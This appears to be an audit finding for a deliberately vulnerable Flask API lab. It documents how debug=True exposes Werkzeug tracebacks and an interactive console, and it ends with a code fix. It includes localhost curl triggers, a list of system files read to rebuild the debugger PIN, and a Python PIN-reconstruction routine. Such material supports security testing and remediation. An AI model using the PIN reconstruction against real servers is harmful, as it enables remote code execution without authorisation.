# H5 – Flask Debug Mode Enabled in Production: PoC

- **ID**: H5
- **Severity**: High
- **PoC-Status**: theoretical
- **Affected file**: `app.py:17`

---

## Vulnerability

`app.py` starts the Flask application with the Werkzeug development server and its interactive debugger unconditionally enabled:

```python
# app.py:17
vuln_app.run(host='0.0.0.0', port=5000, debug=True)
```

Two distinct risks follow from this single flag:

1. **Information disclosure** – any unhandled exception produces a full HTML traceback page that includes local variable values, the full Python call stack, and application source code fragments. This is served to any unauthenticated remote client.
2. **Remote code execution** – the Werkzeug debugger embeds an interactive Python console reachable at `/__debugger__` or inline on any traceback page. The console is protected by a PIN, but that PIN is deterministically derived from publicly observable server attributes (OS username, app module path, machine-id, network MAC). An attacker with read access to `/proc` (e.g., via an SSRF or LFI chain) or with network reconnaissance capability can reconstruct the PIN and execute arbitrary Python code as the application user.

---

## Trigger: Force a Traceback

Any request that reaches an unhandled code path will return the debugger HTML page. The simplest trigger is a malformed `Content-Type` on an endpoint that parses the request body.

```bash
# Step 1 – start the vulnerable container
docker compose up vampi-vulnerable

# Step 2 – send a malformed body to a POST endpoint
curl -i -X POST http://localhost:5002/users/v1/register \
     -H "Content-Type: application/json" \
     --data 'NOT_JSON{'

# Step 3 – trigger a type error via a missing required field
curl -i -X POST http://localhost:5002/users/v1/register \
     -H "Content-Type: application/json" \
     -d '{}'
```

With `debug=True` the HTTP response body is the full Werkzeug HTML traceback. A production server with `debug=False` returns a generic 500 with no internal detail.

```
HTTP/1.1 400 BAD REQUEST
Content-Type: text/html; charset=utf-8

<!DOCTYPE HTML PUBLIC ...>
<title>BadRequest // Werkzeug Debugger</title>
...
  File "/app/api_views/users.py", line 42, in register_user
    username = data['username']
KeyError: 'username'
...
[Interactive Console]
```

The response includes the full file path, line number, local variable state, and a JavaScript-activated interactive console button.

---

## RCE via Werkzeug Debugger PIN

The Werkzeug PIN is derived from the following inputs (source: `werkzeug/debug/__init__.py`):

| Input | Source |
|---|---|
| OS username running the process | `/proc/self/status` → `Uid` → `/etc/passwd` |
| `modname` | always `"flask.app"` |
| `getattr(app, '__name__', ...)` | always `"Flask"` |
| App root path | e.g. `/usr/local/lib/python3.11/site-packages/flask/app.py` |
| Machine ID | `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` |
| Network interface MAC | `/sys/class/net/eth0/address` |

An attacker who can read those files (e.g., via a path traversal or SSRF to `http://localhost/` in a container) can reproduce the PIN-generation algorithm offline and unlock the console.

```python
# PIN reconstruction skeleton (Werkzeug >= 2.x algorithm)
import hashlib, itertools

def get_pin(username, modname, appname, app_path, machine_id, mac_int):
    rv = None
    num = None
    h = hashlib.sha1()
    for bit in itertools.chain(
        [username, modname, appname, app_path],
        [str(machine_id), str(mac_int)]
    ):
        if bit:
            h.update(bit.encode())
    num = f"{int(h.hexdigest(), 16) % 100_000_000_000_000_000_000:020d}"
    pin = "-".join([num[:9], num[9:15], num[15:]])
    return pin

# Fill values from /proc reads, then:
print(get_pin(...))
```

With the reconstructed PIN, the attacker visits `http://target:5000/__debugger__`, enters the PIN, and obtains a full interactive Python REPL running as the application user — equivalent to `os.system("id")` and beyond.

---

## Code Fix

```python
# app.py:17 – remove debug=True for production
if __name__ == '__main__':
    debug = os.getenv('FLASK_DEBUG', '0') == '1'   # opt-in, off by default
    vuln_app.run(host='0.0.0.0', port=5000, debug=debug)
```

For containerised deployments, replace the built-in Werkzeug server entirely with a production WSGI server (Gunicorn, uWSGI) where the interactive debugger is never present regardless of the flag.

```dockerfile
CMD ["gunicorn", "-w", "4", "-b", "0:5000", "app:vuln_app"]
```

---

## Impact

| Property | Value |
|---|---|
| Authentication required | No |
| Network access required | Yes (port 5000 reachable) |
| Additional primitives required for RCE | LFI / SSRF to read `/proc` or `/etc/machine-id` |
| Data exposed without any extras | Full stack traces, source code fragments, local variable values |
